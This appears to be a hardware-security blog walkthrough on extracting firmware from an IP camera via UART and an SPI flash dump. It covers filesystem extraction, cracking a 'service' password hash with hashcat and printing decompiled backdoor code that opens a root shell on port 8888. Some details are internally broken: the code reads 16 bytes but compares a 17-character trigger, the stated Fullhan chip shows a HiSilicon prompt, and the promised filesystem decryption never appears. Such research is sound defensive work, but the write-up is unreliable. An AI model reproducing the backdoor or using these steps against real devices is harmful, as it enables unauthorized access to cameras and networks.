---
title: "Reverse Engineering IoT Firmware: Extracting Hardcoded Credentials"
description: "A step-by-step walkthrough on dumping flash memory from an IP camera, decrypting the filesystem, and discovering backdoor administrator credentials."
date: "2026-06-01"
tags: ["hardware", "reverse-engineering", "firmware", "iot"]
category: "Hardware Security"
cover_image: "/images/covers/iot-re-cover.svg"
draft: false
---

## Introduction

Embedded IoT devices often rely on custom firmware containing hardcoded cryptographic keys, backdoor accounts, or API credentials. In this hardware security writeup, we demonstrate how to physically interface with a popular IP camera, dump its SPI flash memory chip, extract the root filesystem, and discover static credentials buried in binary services.

---

## 1. Physical Reconnaissance & UART Connection

The target device was a standard indoor IP camera. After dismantling the outer casing, we identified the key components on the PCB:
- **SoC**: Fullhan FH8852V100 (ARM core)
- **Flash Memory**: Windbond 25Q128JV (16MB SPI Flash)
- **Debug Port**: A 4-pin header labeled RX, TX, GND, and VCC.

Using a multimeter, we verified the pins and connected a USB-to-UART bridge (FTDI FT232RL) to the RX, TX, and GND pins. We configured the serial terminal with a baud rate of `115200`:

```bash
screen /dev/ttyUSB0 115200
```

Upon powering the camera, we witnessed the U-Boot bootloader sequence. By pressing a key within 3 seconds, we interrupted the boot process and gained access to the U-Boot shell:

```text
Hit any key to stop autoboot:  0
hisilicon #
```

---

## 2. Dumping the SPI Flash Memory

We can dump the flash memory content through the serial interface or via a dedicated programmer. For maximum reliability, we desoldered the SPI Flash chip (SOIC-8 package) and connected it to a **CH341A Miniprogrammer**.

We used `flashrom` on our Linux workstation to read the 16MB flash memory:

```bash
flashrom -p ch341a_spi -r backup_flash.bin
```

We verified the dump's integrity by comparing hashes from multiple reads:

```bash
md5sum backup_flash.bin
```

---

## 3. Extracting the Filesystem

With a solid firmware image, we used `binwalk` to identify filesystems inside the binary:

```bash
binwalk backup_flash.bin
```

Output:
```text
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             u-boot legacy U-Boot image, header size: 64 bytes
262144        0x40000         Linux kernel ARM Boot Image
2097152       0x200000        Squashfs filesystem, little endian, version 4.0
```

We extracted the Squashfs filesystem partition:

```bash
dd if=backup_flash.bin of=rootfs.squashfs bs=1 skip=2097152
unsquashfs rootfs.squashfs
```

---

## 4. Uncovering the Backdoor

We navigated the extracted root directory `./squashfs-root`. Our primary targets were custom web applications, startup scripts, and configurations.

Inside `/etc/shadow`, we found a hashed password for a user called `service`:

```text
service:$6$x9fA2q8p$Gv8q9...:18392:0:99999:7:::
```

We used `hashcat` to crack the SHA-512 crypt hash:

```bash
hashcat -m 1800 -a 0 shadow_hash.txt wordlist.txt
```

Within a few minutes, the hash cracked, revealing the password: `cam_support_dev!`.

### The Binary Backdoor

Additionally, we decompiled a service binary located at `/sbin/debug_monitor`. Using Ghidra, we analyzed its network socket handler. The binary listens on TCP port `8888` and validates incoming connections using a hardcoded challenge-response mechanism:

```c
undefined4 validate_connection(int socket_fd) {
  char input_buffer[64];
  
  read(socket_fd, input_buffer, 16);
  // BACKDOOR ACCESS CHECK
  if (strcmp(input_buffer, "ENABLE_ROOT_SHELL") == 0) {
    system("/bin/sh -i <&0 >&0 2>&0");
    return 1;
  }
  return 0;
}
```

An attacker on the network connecting to port `8888` and sending `ENABLE_ROOT_SHELL` is instantly spawned a root shell over the network.

---

## 5. Defense Mitigation

To protect hardware and software integrity:
- **Secure Boot**: Utilize hardware secure boot to cryptographically verify signature tags before executing code.
- **Remove Backdoors**: Eliminate testing interfaces and hardcoded debugger flags in production builds.
- **Encrypt Filesystems**: Encrypt Squashfs blocks and restrict JTAG/UART access on production PCBs.
